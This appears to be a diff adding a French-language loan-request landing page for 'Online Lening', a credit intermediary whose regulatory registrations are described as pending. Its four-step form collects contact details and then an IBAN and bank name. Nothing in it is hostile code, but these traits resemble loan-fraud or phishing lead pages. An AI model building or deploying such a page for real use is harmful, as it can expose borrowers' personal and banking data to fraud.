@@ -1,0 +1,237 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title data-i18n="doc_title_contact">Être contacté par un conseiller — Online Lening</title>
+  <meta name="description" data-i18n-content="doc_desc_contact" content="Faites votre demande en 4 étapes. Un conseiller Online Lening vous rappelle, sans engagement.">
+  <link rel="icon" type="image/png" href="img/logo.png">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+<div class="legal-bar" data-i18n="legal_bar">Attention, emprunter de l'argent coûte aussi de l'argent.</div>
+
+<header class="site-header">
+  <div class="container">
+    <a class="logo" href="index.html" data-i18n-aria="logo_aria" aria-label="Online Lening, accueil"><img src="img/logo.png" alt="Online Lening"></a>
+    <div class="header-right">
+      <div class="lang-switch" role="group" data-i18n-aria="lang_aria" aria-label="Changer de langue">
+        <button type="button" class="lang-btn" data-lang="fr" aria-pressed="true">FR</button>
+        <button type="button" class="lang-btn" data-lang="nl" aria-pressed="false">NL</button>
+      </div>
+      <a href="index.html" class="back-link" data-i18n="back_home">← Retour à l'accueil</a>
+    </div>
+  </div>
+</header>
+
+<main class="container contact-main">
+
+  <aside class="contact-aside up">
+    <div class="advisor">
+      <div class="advisor-avatar pulse">CL</div>
+      <div><strong data-i18n="advisor_t">Un conseiller dédié</strong><small data-i18n="advisor_s">vous rappelle sous 24 h ouvrables</small></div>
+    </div>
+    <h1 data-i18n="contact_h1">Parlez-nous de votre projet.</h1>
+    <ol class="timeline">
+      <li><span class="n">1</span><div><strong data-i18n="tl1_t">Votre demande</strong><small data-i18n="tl1_s">Deux minutes, sans engagement.</small></div></li>
+      <li><span class="n">2</span><div><strong data-i18n="tl2_t">L'appel du conseiller</strong><small data-i18n="tl2_s">Point sur votre budget et les solutions possibles.</small></div></li>
+      <li><span class="n">3</span><div><strong data-i18n="tl3_t">Vos coordonnées</strong><small data-i18n="tl3_s">Prénom, nom, téléphone et e-mail.</small></div></li>
+      <li><span class="n">4</span><div><strong data-i18n="tl4_t">Coordonnées bancaires</strong><small data-i18n="tl4_s">Vos données bancaires pour le versement des fonds.</small></div></li>
+    </ol>
+    <div class="assurances">
+      <span><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#5BC08A" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="4" y="10" width="16" height="11" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></svg><span data-i18n="assure1">Données protégées (RGPD)</span></span>
+      <span><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#5BC08A" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg><span data-i18n="assure2">Aucun paiement avant le versement des fonds</span></span>
+    </div>
+  </aside>
+
+  <section class="form-card up d1" aria-label="Formulaire de demande">
+
+    <div class="progress" id="progress">
+      <div class="progress-top"><span id="step-count">Étape 1 sur 3</span><span id="step-label">Votre projet</span></div>
+      <div class="progress-track"><div class="progress-bar" id="progress-bar"></div></div>
+    </div>
+
+    <form id="lead-form" novalidate>
+      <!-- Anti-robots : champ invisible, les humains le laissent vide -->
+      <div class="hp" aria-hidden="true">
+        <label>Ne pas remplir <input type="text" name="site_web" tabindex="-1" autocomplete="off"></label>
+      </div>
+
+      <!-- ===== Étape 1 ===== -->
+      <fieldset class="step active" data-step="1" data-label-key="step1_label">
+        <legend class="visually-hidden" data-i18n="step1_label">Votre projet</legend>
+        <h2 data-i18n="s1_h2">Quel est votre projet ?</h2>
+
+        <div class="field-group" data-required="projet">
+          <span class="field-title" id="t-projet" data-i18n="t_projet">Type de crédit</span>
+          <div class="choices" role="radiogroup" aria-labelledby="t-projet">
+            <label class="choice"><input type="radio" name="projet" value="Prêt personnel"><span data-i18n="projet_perso">Prêt personnel</span></label>
+            <label class="choice"><input type="radio" name="projet" value="Prêt auto"><span data-i18n="projet_auto">Prêt auto</span></label>
+            <label class="choice"><input type="radio" name="projet" value="Prêt travaux"><span data-i18n="projet_travaux">Prêt travaux</span></label>
+            <label class="choice"><input type="radio" name="projet" value="Autre projet"><span data-i18n="projet_autre">Autre projet</span></label>
+          </div>
+          <p class="field-error" data-i18n="err_projet">Choisissez un type de crédit.</p>
+        </div>
+
+        <div class="field-group" data-required="montant">
+          <label class="field-title" for="montant" data-i18n="l_montant">Montant souhaité</label>
+          <div class="input-group">
+            <input type="text" id="montant" name="montant" inputmode="numeric" placeholder="10 000" pattern="[0-9\s]+" required>
+            <span>€</span>
+          </div>
+          <p class="field-error" data-i18n="err_montant">Indiquez le montant souhaité (min. 200 €).</p>
+        </div>
+
+        <div class="field-group" data-required="pays">
+          <span class="field-title" id="t-pays" data-i18n="t_pays">Vous habitez en</span>
+          <div class="choices inline" role="radiogroup" aria-labelledby="t-pays">
+            <label class="choice"><input type="radio" name="pays" value="Belgique" checked><span data-i18n="pays_be">Belgique</span></label>
+            <label class="choice"><input type="radio" name="pays" value="France"><span data-i18n="pays_fr">France</span></label>
+          </div>
+        </div>
+
+        <div class="step-nav end">
+          <button type="button" class="btn btn-primary" data-next><span data-i18n="btn_continue">Continuer</span> <span class="arr">→</span></button>
+        </div>
+      </fieldset>
+
+      <!-- ===== Étape 2 ===== -->
+      <fieldset class="step" data-step="2" data-label-key="step2_label">
+        <legend class="visually-hidden" data-i18n="step2_label">Votre situation</legend>
+        <h2 data-i18n="s2_h2">Votre situation</h2>
+
+        <div class="field-group" data-required="situation">
+          <span class="field-title" id="t-situation" data-i18n="t_situation">Situation professionnelle</span>
+          <div class="choices" role="radiogroup" aria-labelledby="t-situation">
+            <label class="choice"><input type="radio" name="situation" value="Salarié(e) CDI"><span data-i18n="sit_cdi">Salarié(e) CDI</span></label>
+            <label class="choice"><input type="radio" name="situation" value="CDD / intérim"><span data-i18n="sit_cdd">CDD / intérim</span></label>
+            <label class="choice"><input type="radio" name="situation" value="Indépendant(e)"><span data-i18n="sit_indep">Indépendant(e)</span></label>
+            <label class="choice"><input type="radio" name="situation" value="Fonctionnaire"><span data-i18n="sit_fonct">Fonctionnaire</span></label>
+            <label class="choice"><input type="radio" name="situation" value="Retraité(e)"><span data-i18n="sit_retraite">Retraité(e)</span></label>
+            <label class="choice"><input type="radio" name="situation" value="Autre"><span data-i18n="sit_autre">Autre</span></label>
+          </div>
+          <p class="field-error" data-i18n="err_situation">Choisissez votre situation.</p>
+        </div>
+
+        <div class="field-group" data-required="credits_en_cours">
+          <span class="field-title" id="t-credits" data-i18n="t_credits">Avez-vous déjà des crédits en cours ?</span>
+          <div class="choices inline" role="radiogroup" aria-labelledby="t-credits">
+            <label class="choice"><input type="radio" name="credits_en_cours" value="Oui"><span data-i18n="oui">Oui</span></label>
+            <label class="choice"><input type="radio" name="credits_en_cours" value="Non"><span data-i18n="non">Non</span></label>
+          </div>
+          <p class="field-error" data-i18n="err_credits">Répondez à cette question.</p>
+        </div>
+
+        <div class="step-nav">
+          <button type="button" class="btn btn-ghost" data-prev data-i18n="btn_back">← Retour</button>
+          <button type="button" class="btn btn-primary" data-next><span data-i18n="btn_continue">Continuer</span> <span class="arr">→</span></button>
+        </div>
+      </fieldset>
+
+      <!-- ===== Étape 3 ===== -->
+      <fieldset class="step" data-step="3" data-label-key="step3_label">
+        <legend class="visually-hidden" data-i18n="step3_label">Vos coordonnées</legend>
+        <h2 data-i18n="s3_h2">Comment vous joindre ?</h2>
+
+        <div class="fields">
+          <label class="field"><span data-i18n="f_prenom">Prénom</span><input type="text" name="prenom" autocomplete="given-name" minlength="2" maxlength="50" pattern="[a-zA-ZÀ-ÿ\s\-']+" required></label>
+          <label class="field"><span data-i18n="f_nom">Nom</span><input type="text" name="nom" autocomplete="family-name" minlength="2" maxlength="50" pattern="[a-zA-ZÀ-ÿ\s\-']+" required></label>
+          <label class="field"><span data-i18n="f_tel">Téléphone</span><input type="tel" name="telephone" autocomplete="tel" placeholder="+32 …" minlength="8" maxlength="20" pattern="[0-9+\s().\-]+" required></label>
+          <label class="field"><span data-i18n="f_email">E-mail</span><input type="email" name="email" autocomplete="email" maxlength="100" required></label>
+        </div>
+
+        <label class="field"><span data-i18n="f_creneau">Quand préférez-vous être appelé ?</span>
+          <select name="creneau">
+            <option value="Dès que possible" data-i18n="opt_asap">Dès que possible</option>
+            <option value="Le matin (9 h – 12 h)" data-i18n="opt_morning">Le matin (9 h – 12 h)</option>
+            <option value="L'après-midi (12 h – 17 h)" data-i18n="opt_afternoon">L'après-midi (12 h – 17 h)</option>
+            <option value="En fin de journée (17 h – 19 h)" data-i18n="opt_evening">En fin de journée (17 h – 19 h)</option>
+          </select>
+        </label>
+
+        <label class="consent">
+          <input type="checkbox" name="consentement" value="oui" required>
+          <span data-i18n="consent_text">J'accepte qu'Online Lening utilise ces informations pour me recontacter au sujet de ma demande, conformément à la <a href="#">politique de confidentialité</a>.</span>
+        </label>
+
+        <p class="alert" id="form-alert" role="alert" hidden></p>
+
+        <div class="step-nav">
+          <button type="button" class="btn btn-ghost" data-prev data-i18n="btn_back">← Retour</button>
+          <button type="button" class="btn btn-primary" data-next><span data-i18n="btn_continue">Continuer</span> <span class="arr">→</span></button>
+        </div>
+      </fieldset>
+
+      <!-- ===== Étape 4 ===== -->
+      <fieldset class="step" data-step="4" data-label-key="step4_label">
+        <legend class="visually-hidden" data-i18n="step4_label">Vos coordonnées bancaires</legend>
+        <h2 data-i18n="s4_h2">Vos coordonnées bancaires</h2>
+
+        <div class="field-group" data-required="iban">
+          <label class="field" for="iban"><span data-i18n="f_iban">Compte bancaire (IBAN)</span><input type="text" id="iban" name="iban" placeholder="BE 1234 5678 9012 34" minlength="15" maxlength="34" pattern="[A-Z0-9\s]+" required></label>
+          <p class="field-error" data-i18n="err_iban">IBAN invalide (15-34 caractères, lettres et chiffres).</p>
+        </div>
+
+        <div class="field-group" data-required="banque">
+          <label class="field" for="banque"><span data-i18n="f_banque">Banque</span>
+            <select id="banque" name="banque" required>
+              <option value="">— Sélectionner une banque —</option>
+              <option value="BNP Paribas Fortis">BNP Paribas Fortis</option>
+              <option value="Belfius">Belfius</option>
+              <option value="KBC">KBC</option>
+              <option value="ING">ING</option>
+              <option value="Argenta">Argenta</option>
+              <option value="Crelan">Crelan</option>
+              <option value="Triodos">Triodos Bank</option>
+              <option value="Beobank">Beobank</option>
+              <option value="Deutsche Bank">Deutsche Bank</option>
+              <option value="Autre">Autre</option>
+            </select>
+          </label>
+          <p class="field-error" data-i18n="err_banque">Sélectionnez une banque.</p>
+        </div>
+
+
+        <p class="alert" id="form-alert" role="alert" hidden></p>
+
+        <div class="step-nav">
+          <button type="button" class="btn btn-ghost" data-prev data-i18n="btn_back">← Retour</button>
+          <button type="submit" class="btn btn-primary" id="submit-btn"><span class="spinner" aria-hidden="true"></span><span data-i18n="btn_submit">Être rappelé par un conseiller</span></button>
+        </div>
+      </fieldset>
+    </form>
+
+    <!-- ===== Confirmation ===== -->
+    <div class="success" id="success" tabindex="-1">
+      <div class="success-icon">
+        <svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="#08774A" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>
+      </div>
+      <h2 data-i18n="success_h2">Merci, c'est bien reçu !</h2>
+      <p data-i18n="success_p">Un conseiller Online Lening vous appelle sous 24 h ouvrables. Gardez votre téléphone à portée de main.</p>
+      <div class="note" data-i18n="success_note">Nous ne vous demanderons jamais de paiement avant le versement des fonds, ni vos codes bancaires.</div>
+      <a class="btn btn-primary" href="index.html" data-i18n="success_btn">Retour à l'accueil</a>
+    </div>
+
+    <!-- Barre de confiance -->
+    <div class="trust-bar">
+      <div class="trust-item"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg><span data-i18n="trust_secure">Données sécurisées</span></div>
+      <div class="trust-item"><svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"/></svg><span data-i18n="trust_notpay">Aucun paiement avant le versement</span></div>
+      <div class="trust-item"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 7v5l4 2"/></svg><span data-i18n="trust_hours">Réponse sous 24 h</span></div>
+    </div>
+
+  </section>
+</main>
+
+<footer class="contact-footer" data-i18n="contact_footer">
+  Online Lening est un intermédiaire de crédit et n'accorde pas lui-même de crédit. Inscriptions FSMA et ORIAS en cours.<br>
+  France : Un crédit vous engage et doit être remboursé. Vérifiez vos capacités de remboursement avant de vous engager.
+</footer>
+
+<script src="js/i18n.js"></script>
+<script src="js/contact.js"></script>
+</body>
+</html>
